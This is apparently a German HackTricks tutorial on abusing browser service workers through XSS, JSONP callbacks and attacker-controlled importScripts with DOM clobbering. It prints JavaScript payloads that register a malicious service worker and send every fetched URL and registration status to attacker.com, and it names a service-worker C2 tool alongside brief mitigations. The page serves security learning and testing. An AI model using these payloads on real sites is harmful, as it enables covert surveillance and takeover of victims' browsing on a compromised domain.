# Missbrauch von Service Workern



<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS erhalten oder HackTricks als PDF herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Grundlegende Informationen

Ein **Service Worker** ist ein Skript, das von Ihrem Browser im Hintergrund ausgef√ºhrt wird, unabh√§ngig von einer Webseite, und Funktionen erm√∂glicht, die keine Webseite oder Benutzerinteraktion erfordern. Dadurch werden die **Offline- und Hintergrundverarbeitungsf√§higkeiten** verbessert. Detaillierte Informationen zu Service Workern finden Sie [hier](https://developers.google.com/web/fundamentals/primers/service-workers). Durch Ausnutzen von Service Workern innerhalb einer verwundbaren Webdom√§ne k√∂nnen Angreifer die Kontrolle √ºber die Interaktionen des Opfers mit allen Seiten innerhalb dieser Dom√§ne erlangen.


### √úberpr√ºfen vorhandener Service Worker

Vorhandene Service Worker k√∂nnen im Abschnitt **Service Worker** des **Anwendungs**-Tabs in den **Entwicklertools** √ºberpr√ºft werden. Eine andere Methode besteht darin, [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) zu besuchen, um eine detailliertere Ansicht zu erhalten.

### Push-Benachrichtigungen

**Push-Benachrichtigungsberechtigungen** beeinflussen direkt die F√§higkeit eines **Service Workers**, ohne direkte Benutzerinteraktion mit dem Server zu kommunizieren. Wenn Berechtigungen verweigert werden, wird das Potenzial des Service Workers zur kontinuierlichen Bedrohung eingeschr√§nkt. Das Gew√§hren von Berechtigungen erh√∂ht hingegen die Sicherheitsrisiken, indem der Empfang und die Ausf√ºhrung potenzieller Exploits erm√∂glicht werden.

## Angriff durch Erstellen eines Service Workers

Um diese Sicherheitsl√ºcke auszunutzen, m√ºssen Sie Folgendes finden:

* Eine M√∂glichkeit, beliebige JS-Dateien auf den Server hochzuladen und einen XSS-Angriff durchzuf√ºhren, um den Service Worker der hochgeladenen JS-Datei zu laden.
* Eine **verwundbare JSONP-Anfrage**, bei der Sie die Ausgabe (mit beliebigem JS-Code) manipulieren k√∂nnen, und einen XSS-Angriff, um das JSONP mit einer Payload zu laden, die einen b√∂sartigen Service Worker l√§dt.

Im folgenden Beispiel werde ich einen Code pr√§sentieren, um einen neuen Service Worker zu registrieren, der das `fetch`-Ereignis abh√∂rt und **jede abgerufene URL an den Server des Angreifers sendet** (dies ist der Code, den Sie zum **Hochladen** auf den **Server** oder zum Laden √ºber eine **verwundbare JSONP**-Antwort ben√∂tigen):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Und dies ist der Code, der den Worker registriert (der Code, den Sie durch Ausnutzung eines XSS-Angriffs ausf√ºhren k√∂nnen). In diesem Fall wird eine GET-Anfrage an den Server des Angreifers gesendet, um zu benachrichtigen, ob die Registrierung des Service Workers erfolgreich war oder nicht:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Im Falle der Ausnutzung eines anf√§lligen JSONP-Endpunkts sollten Sie den Wert in `var sw` platzieren. Zum Beispiel:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Es gibt eine **C2**, die sich auf die Ausnutzung von Service Workern spezialisiert hat, namens [**Shadow Workers**](https://shadow-workers.github.io), die sehr n√ºtzlich sein wird, um diese Schwachstellen auszunutzen.

Die **24-Stunden-Cache-Anweisung** begrenzt die Lebensdauer eines b√∂sartigen oder kompromittierten **Service Workers (SW)** auf h√∂chstens 24 Stunden nach Behebung einer XSS-Schwachstelle, vorausgesetzt, der Client ist online. Um die Anf√§lligkeit zu minimieren, k√∂nnen Website-Betreiber die Time-To-Live (TTL) des SW-Skripts verringern. Entwicklern wird au√üerdem empfohlen, einen [**Service Worker Kill-Switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) zur schnellen Deaktivierung zu erstellen.

## Missbrauch von `importScripts` in einem SW √ºber DOM Clobbering

Die Funktion **`importScripts`**, die von einem Service Worker aufgerufen wird, kann ein Skript von einer anderen Dom√§ne importieren. Wenn diese Funktion mit einem **Parameter aufgerufen wird, den ein Angreifer** √§ndern k√∂nnte, k√∂nnte er ein JS-Skript von seiner Dom√§ne importieren und XSS erhalten.

**Dies umgeht sogar CSP-Schutzma√ünahmen.**

**Beispielhafter gef√§hrdeter Code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Mit DOM Clobbering

Weitere Informationen zu DOM Clobbering finden Sie unter:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Wenn die URL/Domain, die der SW verwendet, um **`importScripts`** aufzurufen, **innerhalb eines HTML-Elements** liegt, ist es **m√∂glich, sie √ºber DOM Clobbering zu √§ndern**, um den SW **ein Skript von Ihrer eigenen Domain laden zu lassen**.

Ein Beispiel daf√ºr finden Sie im Referenzlink.

## Referenzen

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF-Download** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
